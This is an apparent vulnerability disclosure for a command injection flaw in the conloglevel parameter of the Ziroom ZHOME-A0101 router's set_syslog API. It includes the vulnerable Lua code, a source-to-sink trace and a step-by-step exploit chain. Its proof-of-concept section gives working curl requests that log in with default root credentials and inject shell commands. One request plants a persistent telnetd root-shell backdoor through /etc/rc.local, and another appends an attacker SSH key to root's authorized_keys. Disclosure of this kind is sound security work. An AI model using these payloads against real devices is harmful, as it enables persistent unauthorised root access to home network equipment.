# Command Injection Vulnerability in ZHOME ZH-A0101 set_syslog via `conloglevel`

## Overview

- **Vendor:** Ziroom
- **Product:** ZHOME-A0101
- **Firmware Version:** 1.0.1.0, Build 202004151405
- **Platform:** OpenWrt / MediaTek MT7621, MIPS32
- **Vulnerability Type:** Command Injection
- **Affected Endpoint:** `POST /api/ZRnetwork/set_syslog`
- **Affected Parameter:** `conloglevel`
- **Authentication Requirement:** HTTP Basic Auth as `root`
- **Severity:** Critical
- **Special Note:** The function calls `rebootSys()` after writing the setting.

## Vulnerability Information

| Item               | Detail                                          |
| ------------------ | ----------------------------------------------- |
| File               | `usr/lib/lua/luci/controller/api/zrNetwork.lua` |
| Route Definition   | `zrNetwork.lua:79`                              |
| Function           | `set_syslog()`                                  |
| Code Location      | line 1181-1216                                  |
| Injection Location | `zrNetwork.lua:1207`                            |
| Sink               | `luci.sys.call()`                               |

## Vulnerable Code

<img width="1242" height="1152" alt="image" src="https://github.com/user-attachments/assets/0400ee4d-4ba3-4f88-997b-6d347e8e3052" />


```lua
function set_syslog()
    local result = {}
    local LuciHttp = require("luci.http")
    local LuciUtil = require("luci.util")
    local ZRWan = require("luci.model.ZRapi.ZRLanWanFun")
    local fs = require "nixio.fs"

    local conloglevel = LuciHttp.formvalue("conloglevel") or "8"
    local enable_flash = LuciHttp.formvalue("enable_flash") or "0"
    local log_size = LuciHttp.formvalue("log_size") or "200"
    local log_type = ""
    local log_file = "/etc/syslog.txt"

    if enable_flash == "1" then
        log_type = "file"
        luci.sys.call("uci set system.@system[0].log_file="..log_file.." > /dev/null")
    else
        log_type = "circular"
        if fs.access(log_file) then
            LuciUtil.exec("rm  "..log_file)
        end
    end

    luci.sys.call("uci set system.@system[0].log_type="..log_type.." > /dev/null")
    luci.sys.call("uci set system.@system[0].conloglevel="..conloglevel.." > /dev/null")
    luci.sys.call("uci set system.@system[0].log_size="..log_size.." > /dev/null")
    luci.sys.call("uci commit system")

    ZRWan.rebootSys()
    result["code"] = 0
    luci.http.prepare_content("application/json")
    luci.http.write_json(result)
end
```

## Root Cause

The `conloglevel` value is inserted into a UCI shell command without validation:

```sh
uci set system.@system[0].conloglevel=<conloglevel> > /dev/null
```

Shell metacharacters in `conloglevel` are interpreted before the device reboots.

## Source-to-Sink Chain

```text
POST /api/ZRnetwork/set_syslog
    |
    v
LuciHttp.formvalue("conloglevel")
    |
    v
luci.sys.call("uci set system.@system[0].conloglevel=" .. conloglevel .. " > /dev/null")
    |
    v
/bin/sh
    |
    v
ZRWan.rebootSys()
```

## Harmless Verification Example

```bash
curl -s --noproxy "*" -b cookies.txt -X POST \
  --data-urlencode "conloglevel=8;touch /etc/vuln33" \
  --data-urlencode "enable_flash=0" \
  --data-urlencode "log_size=200" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/set_syslog"
```

The request can reboot the device after the command has already executed.



## Impact

An authenticated attacker can execute commands and write persistent files before reboot. Because the affected path writes under system configuration context, the impact can include persistent configuration modification.

## Injection Principle

Normal request:

```text
conloglevel = "8"
```

Concatenated command:

```sh
uci set system.@system[0].conloglevel=8 > /dev/null
```

Injection request:

```text
conloglevel = "8;touch /etc/vuln33"
```

Concatenated command:

```sh
uci set system.@system[0].conloglevel=8;touch /etc/vuln33 > /dev/null
```

Shell execution flow:

1. Command 1: `uci set system.@system[0].conloglevel=8` → executes normally
2. Command 2: `touch /etc/vuln33 > /dev/null` → creates file, `> /dev/null` suppresses output (but `touch` side-effect of file creation is unaffected by the redirect)

Key point: `touch` creates the file as a side-effect; the `> /dev/null` redirect does not prevent file creation. Writing to `/etc/` is a persistent path — the file survives reboot.

## Exploit Chain

```text
Attacker
  │
  ├─ Step 1: Obtain root credentials
  │
  ├─ Step 2: Construct HTTP POST request
  │           URL:  /cgi-bin/luci/;stok=<STOK>/api/ZRnetwork/set_syslog
  │           Body: conloglevel=8;<COMMAND>&enable_flash=0&log_size=200
  │
  ├─ Step 3: luci.sys.call() → os.execute() → /bin/sh executes
  │           Injected command runs after the uci set command
  │
  ├─ Step 4: rebootSys() triggers device reboot
  │           Injected command has already completed before reboot
  │
  └─ Step 5: After reboot, files written to /etc/ persist
```

## Proof of Concept

```bash
# Obtain session token
curl -s --noproxy "*" -c cookies.txt -X POST \
  "http://192.168.18.1/cgi-bin/luci" \
  -d "username=root&password=admin" -L -D headers.txt

STOK=$(grep stok headers.txt | sed 's/.*stok=//;s/\r//;s/\/.*//')

# PoC 1: Create persistent file (survives reboot)
curl -s --noproxy "*" --max-time 5 -b cookies.txt -X POST \
  --data-urlencode "conloglevel=8;touch /etc/vuln33" \
  --data-urlencode "enable_flash=0" \
  --data-urlencode "log_size=200" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/set_syslog"

# PoC 2: Implant persistent backdoor
curl -s --noproxy "*" --max-time 5 -b cookies.txt -X POST \
  --data-urlencode "conloglevel=8;echo 'telnetd -l /bin/sh -p 2323'>>/etc/rc.local" \
  --data-urlencode "enable_flash=0" \
  --data-urlencode "log_size=200" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/set_syslog"

# Connect via telnet after reboot
telnet 192.168.18.1 2323

# PoC 3: Write SSH public key for passwordless login
curl -s --noproxy "*" --max-time 5 -b cookies.txt -X POST \
  --data-urlencode "conloglevel=8;mkdir -p /root/.ssh;echo 'ssh-rsa AAAA...'>>/root/.ssh/authorized_keys" \
  --data-urlencode "enable_flash=0" \
  --data-urlencode "log_size=200" \
  "http://192.168.18.1/cgi-bin/luci/;stok=${STOK}/api/ZRnetwork/set_syslog"
```

## Real Device Verification

```text
Request:  POST /api/ZRnetwork/set_syslog  conloglevel=8;touch /etc/vuln33
Response: (device reboot)
SSH verification: -rw-r--r-- 1 root root 0 Jul 28 15:49 /etc/vuln33  ✅ (persists after reboot)
```

<img width="2019" height="222" alt="image" src="https://github.com/user-attachments/assets/cd139487-8965-420d-b341-9bd82c4bd9c9" />
